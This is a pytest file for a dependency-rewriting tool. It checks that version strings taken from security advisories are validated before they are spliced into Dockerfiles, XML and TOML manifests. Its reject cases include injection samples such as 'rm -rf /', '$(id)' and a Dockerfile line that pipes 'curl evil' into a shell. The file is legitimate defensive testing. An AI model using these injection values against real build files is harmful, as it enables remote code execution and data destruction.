"""Version-literal gate at the ``rewrite()`` chokepoint.

``RewriteEdit.new_value`` originates in OSV advisory ``fixed``
strings — registry content — and rewriters splice it verbatim into
manifests (csproj XML attributes, TOML strings, Dockerfile ARG
lines, YAML image tags). The gate in ``rewriters.rewrite()`` skips
any edit whose target value falls outside the conservative
version-literal grammar, so a hostile advisory can't smuggle
syntax-breaking payloads into a manifest.
"""

from __future__ import annotations

import logging
from pathlib import Path

import pytest

from packages.sca.rewriters import (
    RewriteEdit,
    is_safe_version_literal,
    rewrite,
)

DOCKERFILE = """\
FROM python:3.12-slim
ARG SEMGREP_VERSION=1.50.0
ARG OTHER_VERSION=2.0.0
RUN pip install semgrep==${SEMGREP_VERSION}
"""


def _dockerfile(tmp_path: Path) -> Path:
    p = tmp_path / "Dockerfile"
    p.write_text(DOCKERFILE, encoding="utf-8")
    return p


# ---------------------------------------------------------------------------
# Grammar — accept / reject sets
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("value", [
    "1.2.3",
    "2.0.0-rc1",
    "v5",
    "1.24+dfsg-1",
    "32.2.0-jre",
    "1.163.0",
    "4.17.21",
    "2024.01.15",
    "1_0_0",
    "a" * 128,                    # exactly at the length cap
])
def test_accepts_real_fix_version_shapes(value: str) -> None:
    assert is_safe_version_literal(value)


@pytest.mark.parametrize("value", [
    "",                            # empty
    '1.2.3" Malicious="x',         # double quote (XML attribute breakout)
    "1.2.3'",                      # single quote (TOML/shell breakout)
    "1.2.3\n2.0.0",                # newline (line-oriented manifests)
    "1.2.3\t",                     # other whitespace
    "1.2.3 && rm -rf /",           # spaces + shell metachars
    "<script>",                    # angle brackets (XML/HTML)
    "1.2.3</Version>",             # closing-tag splice
    "$(id)",                       # command substitution
    "${VER}",                      # variable interpolation
    "1.2.3\\n",                    # backslash
    ".hidden",                     # must start alphanumeric
    "-1.2.3",                      # must start alphanumeric
    "a" * 129,                     # over the length cap
    "1.2.3;echo",                  # semicolon
    "python:3.12",                 # colon — image refs are not versions
])
def test_rejects_syntax_breaking_values(value: str) -> None:
    assert not is_safe_version_literal(value)


# ---------------------------------------------------------------------------
# Gate behaviour at the dispatch chokepoint
# ---------------------------------------------------------------------------

def test_rejected_edit_is_skipped_and_file_untouched(
    tmp_path: Path, caplog: pytest.LogCaptureFixture,
) -> None:
    path = _dockerfile(tmp_path)
    edit = RewriteEdit(
        locator="SEMGREP_VERSION",
        old_value="1.50.0",
        new_value='1.50.1"\nRUN curl evil|sh\nARG X="',
    )
    with caplog.at_level(logging.WARNING, logger="packages.sca.rewriters"):
        results = rewrite(path, [edit])
    assert len(results) == 1
    assert results[0].applied is False
    assert results[0].reason.startswith("invalid_new_value")
    assert path.read_text(encoding="utf-8") == DOCKERFILE
    joined = " ".join(r.getMessage() for r in caplog.records)
    assert "SEMGREP_VERSION" in joined


def test_mixed_batch_preserves_result_order(tmp_path: Path) -> None:
    """One hostile edit in a batch must not block the safe ones,
    and results must stay aligned with the input edit order."""
    path = _dockerfile(tmp_path)
    edits = [
        RewriteEdit(locator="SEMGREP_VERSION", old_value="1.50.0",
                    new_value="1.2.3<evil>"),
        RewriteEdit(locator="OTHER_VERSION", old_value="2.0.0",
                    new_value="2.1.0"),
    ]
    results = rewrite(path, edits)
    assert len(results) == 2
    assert results[0].edit is edits[0]
    assert results[0].applied is False
    assert results[0].reason.startswith("invalid_new_value")
    assert results[1].edit is edits[1]
    assert results[1].applied is True
    body = path.read_text(encoding="utf-8")
    assert "ARG OTHER_VERSION=2.1.0" in body
    assert "ARG SEMGREP_VERSION=1.50.0" in body      # untouched
    assert "<evil>" not in body


def test_safe_edit_still_applies(tmp_path: Path) -> None:
    path = _dockerfile(tmp_path)
    results = rewrite(path, [RewriteEdit(
        locator="SEMGREP_VERSION", old_value="1.50.0",
        new_value="1.119.0",
    )])
    assert results[0].applied is True
    assert "ARG SEMGREP_VERSION=1.119.0" in path.read_text(encoding="utf-8")
